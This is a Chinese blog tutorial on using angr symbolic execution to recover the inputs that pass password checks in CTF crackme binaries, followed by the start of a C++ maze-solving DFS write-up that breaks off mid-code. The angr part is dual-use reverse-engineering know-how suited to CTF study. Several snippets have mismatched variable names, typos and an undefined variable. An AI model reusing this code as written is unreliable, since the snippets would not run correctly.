        <content type="html"><![CDATA[<ul><li><p>本人的 <em><strong>angr</strong></em> 学习来源于某位大佬的博客</p></li><li><p>目前本人的angr使用仍不熟练，或许存在部分问题，恳请读者指出</p></li><li><blockquote><p><a href="https://agate-colony-3f5.notion.site/angr_ctf-8a26aa74a4a74c428ef6129e2df6dd02(%E5%A4%A7%E4%BD%AC%E7%9A%84%E6%96%87%E7%AB%A0)">https://agate-colony-3f5.notion.site/angr_ctf-8a26aa74a4a74c428ef6129e2df6dd02(大佬的文章)</a></p></blockquote></li></ul><h1 id="angr-使用详细步骤"><a href="#angr-使用详细步骤" class="headerlink" title="angr 使用详细步骤"></a>angr 使用详细步骤</h1><h2 id="0-引入angr-和claripy"><a href="#0-引入angr-和claripy" class="headerlink" title="0.引入angr 和claripy"></a>0.引入angr 和claripy</h2><h2 id="1-创建项目project"><a href="#1-创建项目project" class="headerlink" title="1.创建项目project"></a>1.创建项目project</h2><p><code>project=angr.Project(path,auto_load_libs=False)</code></p><p>其中path为要运行的文件的路径比如这样</p><p><code>path=&quot;C:\\Users\\DELL\\Desktop\\angr_ctf-master\\solutions\\11_angr_sim_scanf\\11_angr_sim_scanf&quot;</code></p><p>auto_load_libs&#x3D;False的意思是不自动自动载入依赖的库</p><p>如果是位置无关文件，还要加上载入的基地址，比如这样</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">base = <span class="number">0x66666666</span>     <span class="comment"># 动态链接库被装载的时候需要一个基址</span></span><br><span class="line">proj = angr.Project(path, main_opts=&#123;<span class="string">&#x27;base_addr&#x27;</span>: base&#125;)  </span><br></pre></td></tr></table></figure><h2 id="2-设置初始状态initial-state"><a href="#2-设置初始状态initial-state" class="headerlink" title="2.设置初始状态initial_state"></a>2.设置初始状态initial_state</h2><p><code> initial_state = project.factory.entry_state()</code></p><p>其中entry_state()意思是从程序入口点开始的，在elf文件里也就是start函数的开始位置</p><p>如果想知道设置状态的开始地址可以这样</p><p><code> print(intial_state.addr)</code></p><p>打印出这个state的地址</p><p>当然我们可以不选择entry_state()，而是我们自定义的地址</p><p>比如这样</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">start_address = <span class="number">0x08048980</span></span><br><span class="line">initial_state = project.factory.blank_state(addr=start_address)</span><br></pre></td></tr></table></figure><p>blank_state：构造一个“空状态”，它的大多数数据都是未初始化的。当使用未初始化的的数据时，一个不受约束的符号值将会被返回</p><p>.entry_state：构造一个已经准备好从函数入口点执行的状态</p><ul><li>在这个地方还可以添加veritesting 具体用法看文章末尾部分</li></ul><h2 id="3-创建符号位向量，并将其存入内存或者其他地方（非必须）"><a href="#3-创建符号位向量，并将其存入内存或者其他地方（非必须）" class="headerlink" title="3. 创建符号位向量，并将其存入内存或者其他地方（非必须）"></a>3. 创建符号位向量，并将其存入内存或者其他地方（非必须）</h2><p>首先应当说的是，这一部分是为了解决scanf问题而存在的，针对不同的情况我们将会将变量存入不同的地方</p><h3 id="创建符号位向量"><a href="#创建符号位向量" class="headerlink" title="创建符号位向量"></a>创建符号位向量</h3><p>符号位向量是angr用于将符号值注入程序的数据类型。这些将是angr将解决的方程式的“ x”，也就是约束求解时的自变量。可以通过 <code>BVV(value,size)</code> 和 <code>BVS( name, size)</code> 接口创建位向量</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">passwd_size_in_bits = <span class="number">32</span></span><br><span class="line">passwd0 = claripy.BVS(<span class="string">&#x27;passwd0&#x27;</span>, passwd_size_in_bits)</span><br><span class="line">passwd1 = claripy.BVS(<span class="string">&#x27;passwd1&#x27;</span>, passwd_size_in_bits)</span><br><span class="line">passwd2 = claripy.BVS(<span class="string">&#x27;passwd2&#x27;</span>, passwd_size_in_bits)</span><br></pre></td></tr></table></figure><p>应当注意的是，第二个参数时位（bit)的个数，而不是字节的数量</p><h3 id="存入寄存器"><a href="#存入寄存器" class="headerlink" title="存入寄存器"></a>存入寄存器</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">init_state.regs.eax = password0</span><br><span class="line">init_state.regs.ebx = password1</span><br><span class="line">init_state.regs.edx = password2</span><br></pre></td></tr></table></figure><h3 id="存入内存（全局变量）"><a href="#存入内存（全局变量）" class="headerlink" title="存入内存（全局变量）"></a>存入内存（全局变量）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwd0_address = 0x0A29FAA0</span><br><span class="line">pwd1_address = 0x0A29FAA8</span><br><span class="line">pwd2_address = 0x0A29FAB0</span><br><span class="line">init_state.memory.store(pwd0_address, password0)</span><br><span class="line">init_state.memory.store(pwd1_address, password1)</span><br><span class="line">init_state.memory.store(pwd2_address, poassword2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="存入栈空间（局部变量）"><a href="#存入栈空间（局部变量）" class="headerlink" title="存入栈空间（局部变量）"></a>存入栈空间（局部变量）</h3><p>这里涉及到栈平衡，需要先将esp抬高到局部变量之前的位置</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下面我们手动创建本函数的栈,并在对应v2和v1的栈的位置放入我们要求的符号变量</span></span><br><span class="line">init_state.regs.ebp = init_state.regs.esp</span><br><span class="line">init_state.regs.esp -= <span class="number">8</span></span><br><span class="line">v2 = init_state.solver.BVS(<span class="string">&quot;ebp-12&quot;</span>, <span class="number">32</span>)    <span class="comment"># 创建两个符号变量</span></span><br><span class="line">v1 = init_state.solver.BVS(<span class="string">&quot;ebp-16&quot;</span>, <span class="number">32</span>)</span><br><span class="line">init_state.stack_push(v2)</span><br><span class="line">init_state.stack_push(v1)          <span class="comment"># 放入对应位置</span></span><br></pre></td></tr></table></figure><h3 id="接收动态内存（new-malloc"><a href="#接收动态内存（new-malloc" class="headerlink" title="接收动态内存（new malloc)"></a>接收动态内存（new malloc)</h3><p>我们需要将原本应该存变量的堆空间改成虚假的占空间</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下面将接收malloc分配的空间的指针覆盖为指向另外的空内存的指针(地址)用来模拟malloc分配的空间</span></span><br><span class="line">virtual_heap_address0 = <span class="number">0x44444444</span></span><br><span class="line">pointer_to_recv_mallocspace0 = <span class="number">0x0A79A118</span></span><br><span class="line">virtual_heap_address1 = <span class="number">0x44444454</span></span><br><span class="line">pointer_to_recv_mallocspace1 = <span class="number">0x0A79A120</span></span><br><span class="line">init_state.memory.store(pointer_to_recv_mallocspace0, virtual_heap_address0, endness=proj.arch.memory_endness)</span><br><span class="line">init_state.memory.store(pointer_to_recv_mallocspace1, virtual_heap_address1, endness=proj.arch.memory_endness)</span><br><span class="line"><span class="comment"># 创建两个未知的符号变量</span></span><br><span class="line">pwd0 = init_state.solver.BVS(<span class="string">&#x27;pwd0&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">pwd1 = init_state.solver.BVS(<span class="string">&#x27;pwd1&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>)     <span class="comment"># 8个字节,一个字节占8位</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面我们往虚拟的malloc分配的空间写入我们要求解的符号变量</span></span><br><span class="line">init_state.memory.store(virtual_heap_address0, pwd0)</span><br><span class="line">init_state.memory.store(virtual_heap_address1, pwd1)</span><br></pre></td></tr></table></figure><h2 id="4-对函数进行hook-非必须"><a href="#4-对函数进行hook-非必须" class="headerlink" title="4.对函数进行hook(非必须)"></a>4.对函数进行hook(非必须)</h2><p>当然这个部分也不是必须的</p><p>若只有一个函数让路径爆炸,通过hook调用要爆炸的那个函数的指令,替换成执行我们的回调函数(里面手动添加约束条件)</p><p>对函数hook有两种方式，一种是通过原函数的地址进行hook，一种是通过原函数的名字进行hook</p><h3 id="通过地址进行hook"><a href="#通过地址进行hook" class="headerlink" title="通过地址进行hook"></a>通过地址进行hook</h3><p>先看一个例子</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hook_address = <span class="number">0x080486B8</span>                             <span class="comment"># call check_equals_XKSPZSJKJYQCQXZV的指令地址,钩取了这个地址就不会执行那条调用让路径爆炸的指令</span></span><br><span class="line">step_length = <span class="number">5</span>                                       <span class="comment"># hook设置的钩子函数执行完之后,从被钩取的那个地址开始要跳过的字节数(这里就是call .. 的长度,为5字节)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@proj.hook(<span class="params">hook_address, length=step_length</span>)          </span><span class="comment"># 在对应地址设置钩子,length=参数是设置要跳过的字节数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">our_function</span>(<span class="params">state</span>):</span><br><span class="line">    input_address = <span class="number">0x0804A054</span></span><br><span class="line">    size_bytes = <span class="number">16</span></span><br><span class="line">    input_string = state.memory.load(input_address, size_bytes)   <span class="comment"># 获取complex_function函数加密之后的符号变量(user_input)</span></span><br><span class="line">    cmp_string = <span class="string">&quot;XKSPZSJKJYQCQXZV&quot;</span></span><br><span class="line">    <span class="comment"># 下面是claripy来处理if,gcc32的函数是用eax来传回返回值的,根据字符串是否相等传回1或0</span></span><br><span class="line">    state.regs.eax = claripy.If(</span><br><span class="line">        input_string == cmp_string,</span><br><span class="line">        claripy.BVV(<span class="number">1</span>, <span class="number">32</span>),</span><br><span class="line">        claripy.BVV(<span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># claripy.BVV是设置符号常量,如果字符串相等,就将eax设置为1的BVV,不等就设置为0的BVV</span></span><br></pre></td></tr></table></figure><p>这里来源于大佬的原文章，注释已经非常详细了</p><h3 id="通过函数名进行hook"><a href="#通过函数名进行hook" class="headerlink" title="通过函数名进行hook"></a>通过函数名进行hook</h3><p>如果那个路径爆炸的函数被调用多次,直接通过符号名来hook函数所有的调用地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ReplacementCheckEquals</span>(angr.SimProcedure):</span><br><span class="line">       <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, to_check, length</span>):</span><br><span class="line">           user_input_buffer_address = to_check</span><br><span class="line">           user_input_buffer_length = length</span><br><span class="line">           user_input_string = <span class="variable language_">self</span>.state.memory.load(</span><br><span class="line">               user_input_buffer_address,</span><br><span class="line">               user_input_buffer_length</span><br><span class="line">           )</span><br><span class="line">           check_against_string = <span class="string">&#x27;ORSDDWXHZURJRBDH&#x27;</span></span><br><span class="line">           <span class="keyword">return</span> claripy.If(</span><br><span class="line">               user_input_string == check_against_string,</span><br><span class="line">               claripy.BVV(<span class="number">1</span>, <span class="number">32</span>),</span><br><span class="line">               claripy.BVV(<span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">           )</span><br><span class="line"></span><br><span class="line">   check_equals_symbol = <span class="string">&#x27;check_equals_ORSDDWXHZURJRBDH&#x27;</span></span><br><span class="line">   project.hook_symbol(check_equals_symbol, ReplacementCheckEquals())</span><br></pre></td></tr></table></figure><p>再介绍一种hook scanf函数的方法，这里要涉及到将位向量转换成全局变量的过程</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ReplacementScanf</span>(angr.SimProcedure):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, format_string, param0, param1</span>):</span><br><span class="line">            scanf0 = claripy.BVS(<span class="string">&#x27;scanf0&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">            scanf1 = claripy.BVS(<span class="string">&#x27;scanf1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">            scanf0_address = param0</span><br><span class="line">            <span class="variable language_">self</span>.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">            scanf1_address = param1</span><br><span class="line">            <span class="variable language_">self</span>.state.memory.store(scanf1_address, scanf1, endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">self</span>.state.<span class="built_in">globals</span>[<span class="string">&#x27;solutions&#x27;</span>] = (scanf0, scanf1) <span class="comment">#转化成全局变量</span></span><br><span class="line"></span><br><span class="line">    scanf_symbol = <span class="string">&#x27;__isoc99_scanf&#x27;</span></span><br><span class="line">    project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br></pre></td></tr></table></figure><h2 id="5-设置Simulation-Managers"><a href="#5-设置Simulation-Managers" class="headerlink" title="5. 设置Simulation Managers"></a>5. 设置Simulation Managers</h2><p>SimState   对象包含程序运行时信息，如内存&#x2F;寄存器&#x2F;文件系统数据等。SM（Simulation Managers）是angr中最重要的控制接口，它使你能够同时控制一组状态(state)的符号执行，应用搜索策略来探索程序的状态空间。</p><p><code>simulation = project.factory.simgr(initial_state)</code></p><h2 id="6-运行，探索满足路径需要的值"><a href="#6-运行，探索满足路径需要的值" class="headerlink" title="6. 运行，探索满足路径需要的值"></a>6. 运行，探索满足路径需要的值</h2><p><code> simulation.explore(find=···，avoid=···)</code></p><p>这里有两种方式设置成功和避免的条件，一种是通过地址，一种是通过检验输出</p><h3 id="通过地址的方式"><a href="#通过地址的方式" class="headerlink" title="通过地址的方式"></a>通过地址的方式</h3><p>即在<code>find=</code>和<code>avoid=</code>后面添加地址</p><p><code> simulation.explore(find=0x405000，avoid=0x404700)</code></p><h3 id="通过检验输出的方式"><a href="#通过检验输出的方式" class="headerlink" title="通过检验输出的方式"></a>通过检验输出的方式</h3><p>很多时候，成功的标志都是输出一个提示符，失败也一样,因此我们可以通过检验输出来判断是否成功</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):    <span class="comment"># 判断是否输出&#x27;Good Job.&#x27;的state</span></span><br><span class="line">    stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">should_abort</span>(<span class="params">state</span>):    <span class="comment"># 避免输出&#x27;Try again.&#x27;的state</span></span><br><span class="line">    stdout_output = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line">simulation.explore(find=is_successful, avoid=should_abort)</span><br></pre></td></tr></table></figure><p>要注意这里<code>find</code>和<code>avoid</code>后面的函数不加<code>()</code></p><p>这里的 <code>.posix.dumps()</code> 中 ，括号里面是0的时候代表输入，是1的时候代表输出</p><h2 id="7-获取执行结果"><a href="#7-获取执行结果" class="headerlink" title="7. 获取执行结果"></a>7. 获取执行结果</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]  <span class="comment"># 获取通过 explore 找到符合条件的状态</span></span><br><span class="line">        solution = solution_state.posix.dumps(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Success! Solution is: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution.decode(<span class="string">&quot;utf-8&quot;</span>)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no!&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个例子只获取了一个解，如果想要获取多解，可以遍历simulation.found</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> simulation.found:</span><br><span class="line">solution_state=i</span><br><span class="line">···</span><br></pre></td></tr></table></figure><h2 id="8-添加约束条件（非必须）"><a href="#8-添加约束条件（非必须）" class="headerlink" title="8. 添加约束条件（非必须）"></a>8. 添加约束条件（非必须）</h2><p>在第7步中间可以添加约束条件，这往往用在路径爆炸的时候，explore的成功标志在在路径爆炸之前，然后在第7步的时候手动添加限制条件</p><p>比如这样：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> simulation.found:                                       <span class="comment"># 如果找到了可以执行到stop_address的state就往下执行</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> simulation.found:</span><br><span class="line">        solution_state = x</span><br><span class="line">        constrained_input_address = <span class="number">0x804a050</span>              <span class="comment"># 符号变量存放的地址(模拟输入)</span></span><br><span class="line">        constrained_size_bytes = <span class="number">16</span>                        <span class="comment"># 0x804a050地址开始存放了16字节</span></span><br><span class="line">        <span class="comment"># 取出了我们的符号变量被complex_function函数加密之后的结果</span></span><br><span class="line">        constrained_bitvector = solution_state.memory.load(constrained_input_address, constrained_size_bytes)</span><br><span class="line">        <span class="comment"># 下面手动添加约束条件,让其和比较字符串相等</span></span><br><span class="line">        cmp_string = <span class="string">&quot;BWYRUBQCMVSBRGFU&quot;</span></span><br><span class="line">        <span class="comment"># solution_state.add_constraints(constrained_bitvector == cmp_string)    也可像下方一样写</span></span><br><span class="line">        solution_state.solver.add(constrained_bitvector == cmp_string)</span><br><span class="line">        <span class="comment"># 得到结果</span></span><br><span class="line">        solved_string = solution_state.se.<span class="built_in">eval</span>(string, cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(solved_string)</span><br></pre></td></tr></table></figure><p>先取变量，使用<code>.solver.add</code>添加约束条件，使用<code>.se.eval</code>获得符合条件的值</p><h1 id="其他的一些东西"><a href="#其他的一些东西" class="headerlink" title="其他的一些东西"></a>其他的一些东西</h1><h3 id="veritesting"><a href="#veritesting" class="headerlink" title="veritesting"></a>veritesting</h3><p>简单来说就是Veritesting结合了静态符合执行与动态符号执行，减少了路径爆炸的影响，在angr里我们只要在构造模拟管理器时，启用Veritesting了就行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">simulation=project.factory.simgr(initial_state, veritesting=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="静态编译的处理方法"><a href="#静态编译的处理方法" class="headerlink" title="静态编译的处理方法"></a>静态编译的处理方法</h3><p>这里其实就是对库函数进行一些hook所在的步骤位置在第4步</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;fopen&#x27;</span>]</span><br><span class="line">angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;fclose&#x27;</span>]</span><br><span class="line">angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;fwrite&#x27;</span>]</span><br><span class="line">angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;getchar&#x27;</span>]</span><br><span class="line">angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;strncmp&#x27;</span>]</span><br><span class="line">angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;strcmp&#x27;</span>]</span><br><span class="line">angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;scanf&#x27;</span>]</span><br><span class="line">angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;exit&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proj.hook(<span class="number">0x08048D10</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__libc_start_main&#x27;</span>]())</span><br><span class="line">proj.hook(<span class="number">0x0804ED40</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;printf&#x27;</span>]())</span><br><span class="line">proj.hook(<span class="number">0x0804ED80</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;scanf&#x27;</span>]())</span><br><span class="line">proj.hook(<span class="number">0x0804F350</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;puts&#x27;</span>]())</span><br><span class="line">proj.hook(<span class="number">0x0805B450</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;strcmp&#x27;</span>]())</span><br></pre></td></tr></table></figure><h3 id="栈溢出利用"><a href="#栈溢出利用" class="headerlink" title="栈溢出利用"></a>栈溢出利用</h3><p>angr可以实现对漏洞的利用，在这里不做详细解释(因为笔者不太会pwn)</p><h1 id="附加-公式模板"><a href="#附加-公式模板" class="headerlink" title="附加 公式模板"></a>附加 公式模板</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    path=<span class="string">&#x27;D:\\CTF_tools\\ez_fardebug.exe&#x27;</span></span><br><span class="line">    project =angr.Project(path)</span><br><span class="line">    initial_state=project.factory.entry_state(</span><br><span class="line">        add_options =&#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                       angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    simulation =project.factory.simgr(initial_state)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">        stdout_ouput=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> stdout_ouput == <span class="string">b&#x27;you got it&#x27;</span></span><br><span class="line">    <span class="keyword">def</span>  <span class="title function_">should_abort</span>(<span class="params">state</span>):</span><br><span class="line">        stdout_ouput=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> stdout_ouput == <span class="string">b&#x27;wrong&#x27;</span></span><br><span class="line">    simulation.explore(find=is_successful,avoid=should_abort)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state =simulation.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no！&quot;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> angr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>迷宫问题中的dfs(基础模板)</title>
      <link href="/2023/03/19/2023-03-19-%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98%E4%B8%AD%E7%9A%84dfs%20%20(%E5%9F%BA%E7%A1%80%E6%A8%A1%E6%9D%BF)/"/>
      <url>/2023/03/19/2023-03-19-%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98%E4%B8%AD%E7%9A%84dfs%20%20(%E5%9F%BA%E7%A1%80%E6%A8%A1%E6%9D%BF)/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近本人在做 WolvCTF 的时候遇到了一个特别有意思的迷宫题，在写dfs的时候遇到了一些问题（www，本人高中还是信竞生，连个dfs都写不出来，这是太没用了……）最后由本人在之前写过的一道简单的迷宫题题解中得到了启发，在此阐释一下我对迷宫中dfs的模板理解。</p><p>当然，本人的理解基于自己在高中时学过的知识，可能带有个人风格，读者可以按照自己的习惯来</p><h1 id="一道简单的迷宫题，但已经基本有了迷宫题的dfs所具有的特征"><a href="#一道简单的迷宫题，但已经基本有了迷宫题的dfs所具有的特征" class="headerlink" title="一道简单的迷宫题，但已经基本有了迷宫题的dfs所具有的特征"></a>一道简单的迷宫题，但已经基本有了迷宫题的dfs所具有的特征</h1><p>我们先看那一道比较简单的dfs是如何写的</p><p>题目是NSSCTF平台上的sadmaze题目，在本人的个人做题记录中有</p><p>这个迷宫的地图是这样的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1111111111111111111111111111111</span><br><span class="line">1S00100010000010000000000000001</span><br><span class="line">1110111010101111101111101111101</span><br><span class="line">1010001000100000100000100000101</span><br><span class="line">1011101011101110111110111011111</span><br><span class="line">1000101000101010000010101000001</span><br><span class="line">1011101110111011101110101110101</span><br><span class="line">1000000010001010001000001010101</span><br><span class="line">1011111111101011101111101011101</span><br><span class="line">1000100000000010100000101010001</span><br><span class="line">1110111011101010111110101011101</span><br><span class="line">1000001000101000000010000000101</span><br><span class="line">1111101111111111111011111111101</span><br><span class="line">1010000000000010101010000000001</span><br><span class="line">1011111111101010101011101111111</span><br><span class="line">1010001000101010001000100000001</span><br><span class="line">1011101110111010111011111111101</span><br><span class="line">10100010000010101000001T1000001</span><br><span class="line">1010101010111010101111101110101</span><br><span class="line">1000100010001010000010000010101</span><br><span class="line">1011111110101011111010111110101</span><br><span class="line">1010001010101000101000100000101</span><br><span class="line">1010111011101011101110101111101</span><br><span class="line">1000100000001010000010100010101</span><br><span class="line">1110101111101011101011101110101</span><br><span class="line">1010100000101000001000001010001</span><br><span class="line">1010111110111111111111111010101</span><br><span class="line">1000000010000010000000001000101</span><br><span class="line">1111101110101110111110101011111</span><br><span class="line">1000001000100000001000100000001</span><br><span class="line">1111111111111111111111111111111</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>走迷宫的规则是这样的，S是起点，T是终点，1不能碰，0可以碰</p><p>先贴上本人的dfs代码（当时这份代码本人一次就写对了，呜呜呜）</p><p>代码语言C++</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">char</span> Map[<span class="number">81889</span>]=&#123;</span><br><span class="line"><span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, </span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>,</span><br><span class="line">  ****** </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> map[<span class="number">31</span>][<span class="number">31</span>];<span class="comment">//用于记录地图，同时也用来标记是否已经走过这个位置</span></span><br><span class="line"><span class="type">char</span> t[<span class="number">1000</span>];<span class="comment">//记录这条路径从起点到当前位置的操作</span></span><br><span class="line"><span class="type">int</span> r=<span class="number">0</span>;<span class="comment">//记录当前路径从起点到当前位置的步数</span></span><br><span class="line"><span class="type">int</span> dx[<span class="number">4</span>]=&#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;<span class="comment">//x方向的移动</span></span><br><span class="line"><span class="type">int</span> dy[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;<span class="comment">//y方向的移动</span></span><br><span class="line"><span class="type">char</span> op[<span class="number">4</span>]=&#123;<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>&#125;;<span class="comment">//操作 w是上 d是右 s是下 a是左 与dx[]和dy[]是对应的</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> qx,<span class="type">int</span> qy)</span></span>&#123;<span class="comment">//检查这个点是否合法 </span></span><br><span class="line"><span class="keyword">if</span>(qx&gt;=<span class="number">0</span>&amp;&amp;qx&lt;<span class="number">31</span>&amp;&amp;qy&gt;=<span class="number">0</span>&amp;&amp;qy&lt;<span class="number">31</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(map[qx][qy]==<span class="string">&#x27;0&#x27;</span>||map[qx][qy]==<span class="string">&#x27;T&#x27;</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;<span class="comment">//深搜基本功 </span></span><br><span class="line"><span class="keyword">if</span>(map[x][y]==<span class="string">&#x27;T&#x27;</span>)&#123;<span class="comment">//找到终点了！</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;r;i++)cout&lt;&lt;t[i];</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;r;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;<span class="comment">//向四个方向前进</span></span><br><span class="line"><span class="type">int</span> qx=dx[i]+x;<span 